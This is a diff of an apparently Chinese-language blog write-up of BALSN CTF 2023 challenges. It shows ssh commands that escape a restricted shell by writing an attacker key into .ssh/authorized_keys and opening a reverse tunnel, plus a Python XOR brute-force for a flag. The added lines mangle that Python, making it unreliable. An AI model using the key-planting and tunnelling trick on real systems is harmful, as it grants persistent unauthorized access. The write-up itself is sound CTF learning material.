@@ -13,9 +13,8 @@ Oct 18, 2023
 <span id=readingTime>min read</span></div></div><div class=featured-image><img class=img-fluid src=/images/CTF.png alt="BALSN 2023 WriteUp"></div><article class="page-content p-2"><h1 id=balsn-2023-writeup>balsn-2023-writeup</h1><p>與 B33f 50UP 戰隊一起合打的。</p><h2 id=戰績>戰績</h2><p><img src=https://github.com/user-attachments/assets/c90ad3e2-3195-4f15-9c40-658aa691e53e alt=image></p><h2 id=kshell>KShell</h2><p><img src=https://github.com/user-attachments/assets/37a8e79e-ad82-44d4-9139-8b23fa340fba alt=image></p><p>連到 <code>nc kshell.balsnctf.com 7122</code> 會有一個受限的 shell 要做逃脫，用 <code>help</code> 看能用的指令只有這些，沒有 pipe 沒有 redirect</p><p><img src=https://github.com/user-attachments/assets/b97f8b7b-1a6f-4a73-a621-760c864e93da alt=image></p><p>裡面最複雜的應該是 <code>ssh</code> 所以從他開刀。思路大概是想辦法找到 <code>自由寫檔</code> 把 ssh key 寫進 .ssh/authorized_keys 然後從裡面把 ssh port 用 ssh tunnel 打出去再從外面 ssh 打進去。
 原本是想利用 -E 可以把 stderr 寫到特定檔案這點。因此想辦法尋找一些可控的 field 並且是最前面的來做到寫 key。原本是想用 username 然後讓他出現 <code>&lt;username>@&lt;hostname> Permission denied (publickey)</code> 的 log。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ssh -E .ssh/authorized_keys <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy&#34;</span>@localhost
 </code></pre></div><p>然而在裡面測試後發現他的 ssh Permission denied 訊息沒有 username 如：<code>Permission denied (publickey)</code> 這就頭痛了。後來有想到用 filename。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ssh -E <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy@localhost&#34;</span>
-
-ssh -E .ssh/authorized_keys -F <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy@localhost&#34;</span> localhost
-</code></pre></div><p>然而 key 裡面的 <code>/</code> 會有影響，而且 rsa 的 key 太長了 (當時沒有想到可以用 ecdsa 所以就跟官方解擦身而過了 QQ)</p><p>最後我突然注意到 <code>.ssh/known_hosts</code> 不也是 ssh 的 public key 嗎？我只要想辦法把 hostname 改成 authorized_keys 的特殊參數組成類似下面的格式就可以了。</p><pre><code>pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M=
+<p>ssh -E .ssh/authorized_keys -F <span style=color:#e6db74>&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy@localhost&quot;</span> localhost
+</code></pre></div><p>然而 key 裡面的 <code>/</code> 會有影響，而且 rsa 的 key 太長了 (當時沒有想到可以用 ecdsa 所以就跟官方解擦身而過了 QQ)</p></p><p>最後我突然注意到 <code>.ssh/known_hosts</code> 不也是 ssh 的 public key 嗎？我只要想辦法把 hostname 改成 authorized_keys 的特殊參數組成類似下面的格式就可以了。</p><pre><code>pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M=
 </code></pre><p>於是就構建了下面的 payload</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ssh -o UserKnownHostsFile<span style=color:#f92672>=</span>.ssh/authorized_keys -o HostKeyAlias<span style=color:#f92672>=</span>pty root@&lt;remote hostname&gt;
 </code></pre></div><p><img src=https://github.com/user-attachments/assets/e2f52ba8-5b2d-4b2a-998d-e020045083cf alt=image></p><p>接下來就是從裡面打 ssh tunnel 出來了。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ssh -R 2222:localhost:22 root@&lt;remote hostname&gt;
 </code></pre></div><p>然後在遠端伺服器把 <code>/etc/ssh/</code> 下面的 host key 複製到 <code>.ssh/</code> 下面然後</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ssh kShell@localhost -p <span style=color:#ae81ff>2222</span>
@@ -24,81 +23,66 @@ ssh -E .ssh/authorized_keys -F <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC
 離開迴圈後，把這個數 * 4 + -30000000000000000 然後轉字串接著將位置在 0x498040 ~ 0x498067 的資料與這個數字字串做 xor 就能得到 Flag 了（雖說這樣講但到頭來那個數字還是得用猜的）。</p><p><img src=https://github.com/user-attachments/assets/9c065411-9445-4091-9235-fbe4903282fa alt=image></p><p>雖然要猜，但是一些部分還是有跡可循，首先數字字串並沒有 0x28 那麼長，xor 的過程中 index 到 0xf 就會回到 0x0 了所以一定有些部分是用一樣的數字然後 flag 是 BALSN{printable+} 所以我們可以用前面 <code>BALSN{</code> 跟後面 <code>}</code> 取得那個位置的數字，接著找其他也用這個數字的位置換成 flag 我們就可以得出這個。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>data <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x73\x75\x7D\x66\x77\x49\x5A\x60\x50\x7E\x67\x08\x44\x66\x40\x02\x5E\x7B\x01\x7A\x66\x03\x5B\x65\x03\x47\x0F\x0D\x59\x4D\x6C\x5B\x7F\x6B\x52\x02\x7F\x13\x15\x48</span><span style=color:#e6db74>&#34;</span>
 prefix <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;BALSN{</span><span style=color:#ae81ff>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#e6db74>}&#34;</span>
 check <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#e6db74>&#34;</span>
-
-
-check <span style=color:#f92672>=</span> bytearray(check)
-
-<span style=color:#66d9ef>for</span> a <span style=color:#f92672>in</span> range(len(data)):
-    <span style=color:#66d9ef>if</span> prefix[a] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
-        check[a <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>=</span> prefix[a] <span style=color:#f92672>^</span> data[a]
-
-check <span style=color:#f92672>=</span> bytes(check)
-
-<span style=color:#66d9ef>print</span>(check)
-
-ans <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
-
-<span style=color:#66d9ef>for</span> a <span style=color:#f92672>in</span> range(len(data)):
-    <span style=color:#66d9ef>if</span> check[a <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
-        ans <span style=color:#f92672>+=</span> bytes([check[a <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>^</span> data[a]])
-    <span style=color:#66d9ef>else</span>:
-        ans <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>
-
-<span style=color:#66d9ef>print</span>(ans)
-
-</code></pre></div><p><img src=https://github.com/user-attachments/assets/831deb54-e3d8-4db6-9dc8-c8a44cf2688c alt=image></p><p>然後未知的部分我們可以用爆的看看，首先找到未知的位置從 0~9 測一次會不會出現 printable 的字元如果有我們再用相同的數字測看看用同樣數字 index 的其他位置是不是有 printable 的字元，然後把所有符合規則的可能印出來。但是因為這個可能還是很龐大，所以我們可以先把 printable 的字元 list 縮小一下</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#printable = b&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&#34;#$%&amp;\&#39;()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~&#39;</span>
+<p>check <span style=color:#f92672>=</span> bytearray(check)</p>
+<p><span style=color:#66d9ef>for</span> a <span style=color:#f92672>in</span> range(len(data)):
+<span style=color:#66d9ef>if</span> prefix[a] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
+check[a <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>=</span> prefix[a] <span style=color:#f92672>^</span> data[a]</p>
+<p>check <span style=color:#f92672>=</span> bytes(check)</p>
+<p><span style=color:#66d9ef>print</span>(check)</p>
+<p>ans <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&quot;&quot;</span></p>
+<p><span style=color:#66d9ef>for</span> a <span style=color:#f92672>in</span> range(len(data)):
+<span style=color:#66d9ef>if</span> check[a <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
+ans <span style=color:#f92672>+=</span> bytes([check[a <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>^</span> data[a]])
+<span style=color:#66d9ef>else</span>:
+ans <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>'</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>'</span></p>
+<p><span style=color:#66d9ef>print</span>(ans)</p>
+<p></code></pre></div><p><img src=https://github.com/user-attachments/assets/831deb54-e3d8-4db6-9dc8-c8a44cf2688c alt=image></p></p><p>然後未知的部分我們可以用爆的看看，首先找到未知的位置從 0~9 測一次會不會出現 printable 的字元如果有我們再用相同的數字測看看用同樣數字 index 的其他位置是不是有 printable 的字元，然後把所有符合規則的可能印出來。但是因為這個可能還是很龐大，所以我們可以先把 printable 的字元 list 縮小一下</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#printable = b&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&#34;#$%&amp;\&#39;()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~&#39;</span>
 printable <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_&#39;</span>
-
-data <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x73\x75\x7D\x66\x77\x49\x5A\x60\x50\x7E\x67\x08\x44\x66\x40\x02\x5E\x7B\x01\x7A\x66\x03\x5B\x65\x03\x47\x0F\x0D\x59\x4D\x6C\x5B\x7F\x6B\x52\x02\x7F\x13\x15\x48</span><span style=color:#e6db74>&#34;</span>
-prefix <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;BALSN{</span><span style=color:#ae81ff>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#e6db74>}&#34;</span>
-
-<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getans</span>(check):
-    ans <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>
-    <span style=color:#66d9ef>for</span> a <span style=color:#f92672>in</span> range(len(data)):
-        <span style=color:#66d9ef>if</span> check[a <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
-            ans <span style=color:#f92672>+=</span> bytes([check[a <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>^</span> data[a]])
-        <span style=color:#66d9ef>else</span>:
-            ans <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>
-    <span style=color:#66d9ef>print</span>(ans)
-
-<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>trycheck</span>(check, index):
-    check <span style=color:#f92672>=</span> bytearray(check)
-    <span style=color:#66d9ef>if</span> prefix[index] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
-        check[index <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>=</span> prefix[index] <span style=color:#f92672>^</span> data[index]
-        <span style=color:#66d9ef>if</span> index <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;</span> len(data):
-            trycheck(bytes(check), index<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)
-        <span style=color:#66d9ef>elif</span> int((int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>==</span> \
-             int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>:
-            getans(check)
-    <span style=color:#66d9ef>elif</span> check[index <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
-        <span style=color:#66d9ef>if</span> index <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;</span> len(data):
-            trycheck(bytes(check), index<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)
-        <span style=color:#66d9ef>elif</span> int((int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>==</span> \
-             int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>:
-            getans(check)
-    <span style=color:#66d9ef>else</span>:
-        <span style=color:#66d9ef>for</span> a <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>):
-            <span style=color:#66d9ef>if</span> bytes([ord(str(a)) <span style=color:#f92672>^</span> data[index]]) <span style=color:#f92672>in</span> printable <span style=color:#f92672>and</span> \
-               bytes([ord(str(a)) <span style=color:#f92672>^</span> data[index <span style=color:#f92672>|</span> <span style=color:#ae81ff>0x10</span>]]) <span style=color:#f92672>in</span> printable <span style=color:#f92672>and</span> \
-               (index <span style=color:#f92672>|</span> <span style=color:#ae81ff>0x20</span> <span style=color:#f92672>&gt;=</span> len(data) <span style=color:#f92672>or</span> \
-               bytes([ord(str(a)) <span style=color:#f92672>^</span> data[index <span style=color:#f92672>|</span> <span style=color:#ae81ff>0x20</span>]]) <span style=color:#f92672>in</span> printable):
-                check[index <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>=</span> ord(str(a))
-                <span style=color:#66d9ef>if</span> index <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;</span> len(data):
-                    trycheck(bytes(check), index<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)
-                <span style=color:#66d9ef>elif</span> int((int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>==</span> \
-                     int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>:
-                    getans(check)
-
-
-checktmp <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#e6db74>&#34;</span>
-
-trycheck(checktmp, <span style=color:#ae81ff>0</span>)
-</code></pre></div><p>然後把一些看起來從頭到尾沒變過的濾出來得到 <code>b'BALSN{nU\x00\x00\x00\x00\x00\x00\x00\x00oO0O_1oP\x00\x00\x00\x00\x00\x00\x00\x00N_c7F!!}'</code>
+<p>data <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&quot;</span><span style=color:#ae81ff>\x73\x75\x7D\x66\x77\x49\x5A\x60\x50\x7E\x67\x08\x44\x66\x40\x02\x5E\x7B\x01\x7A\x66\x03\x5B\x65\x03\x47\x0F\x0D\x59\x4D\x6C\x5B\x7F\x6B\x52\x02\x7F\x13\x15\x48</span><span style=color:#e6db74>&quot;</span>
+prefix <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&quot;BALSN{</span><span style=color:#ae81ff>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#e6db74>}&quot;</span></p>
+<p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getans</span>(check):
+ans <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>''</span>
+<span style=color:#66d9ef>for</span> a <span style=color:#f92672>in</span> range(len(data)):
+<span style=color:#66d9ef>if</span> check[a <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
+ans <span style=color:#f92672>+=</span> bytes([check[a <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>^</span> data[a]])
+<span style=color:#66d9ef>else</span>:
+ans <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>'</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>'</span>
+<span style=color:#66d9ef>print</span>(ans)</p>
+<p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>trycheck</span>(check, index):
+check <span style=color:#f92672>=</span> bytearray(check)
+<span style=color:#66d9ef>if</span> prefix[index] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
+check[index <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>=</span> prefix[index] <span style=color:#f92672>^</span> data[index]
+<span style=color:#66d9ef>if</span> index <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;</span> len(data):
+trycheck(bytes(check), index<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)
+<span style=color:#66d9ef>elif</span> int((int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672><em></span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>==</span><br>
+int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>:
+getans(check)
+<span style=color:#66d9ef>elif</span> check[index <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
+<span style=color:#66d9ef>if</span> index <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;</span> len(data):
+trycheck(bytes(check), index<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)
+<span style=color:#66d9ef>elif</span> int((int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672></em></span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>==</span><br>
+int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>:
+getans(check)
+<span style=color:#66d9ef>else</span>:
+<span style=color:#66d9ef>for</span> a <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>):
+<span style=color:#66d9ef>if</span> bytes([ord(str(a)) <span style=color:#f92672>^</span> data[index]]) <span style=color:#f92672>in</span> printable <span style=color:#f92672>and</span><br>
+bytes([ord(str(a)) <span style=color:#f92672>^</span> data[index <span style=color:#f92672>|</span> <span style=color:#ae81ff>0x10</span>]]) <span style=color:#f92672>in</span> printable <span style=color:#f92672>and</span><br>
+(index <span style=color:#f92672>|</span> <span style=color:#ae81ff>0x20</span> <span style=color:#f92672>&gt;=</span> len(data) <span style=color:#f92672>or</span><br>
+bytes([ord(str(a)) <span style=color:#f92672>^</span> data[index <span style=color:#f92672>|</span> <span style=color:#ae81ff>0x20</span>]]) <span style=color:#f92672>in</span> printable):
+check[index <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span>] <span style=color:#f92672>=</span> ord(str(a))
+<span style=color:#66d9ef>if</span> index <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;</span> len(data):
+trycheck(bytes(check), index<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)
+<span style=color:#66d9ef>elif</span> int((int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>==</span><br>
+int(bytes(check)<span style=color:#f92672>.</span>decode()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>30000000000000000</span>:
+getans(check)</p>
+<p>checktmp <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&quot;</span><span style=color:#ae81ff>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#e6db74>&quot;</span></p>
+<p>trycheck(checktmp, <span style=color:#ae81ff>0</span>)
+</code></pre></div><p>然後把一些看起來從頭到尾沒變過的濾出來得到 <code>b&rsquo;BALSN{nU\x00\x00\x00\x00\x00\x00\x00\x00oO0O_1oP\x00\x00\x00\x00\x00\x00\x00\x00N_c7F!!}'</code>
 然後更新一下 <code>prefix</code> 再測一次，這次再跑完以後翻找出一個看起來有比較多合理單字的 flag 得到：
-<code>b'BALSN{nUdK_1s_s0oO0O_1oP7r74nt_iN_c7F!!}'</code>
+<code>b&rsquo;BALSN{nUdK_1s_s0oO0O_1oP7r74nt_iN_c7F!!}'</code>
 然後把不太像的字元拔掉
-<code>b'BALSN{nU\x00\x00_1s_s0oO0O_1oP\x00\x00\x00\x00\x00\x00_iN_c7F!!}'</code>
-更新一下 <code>prefix</code> 再測一次</p><p><img src=https://github.com/user-attachments/assets/62752e70-9ba5-4c0a-9b23-3b86620d12d8 alt=image></p><p>這次的結果數量就少很多，可以試著把 printable 的字元增加一些或全部使用。
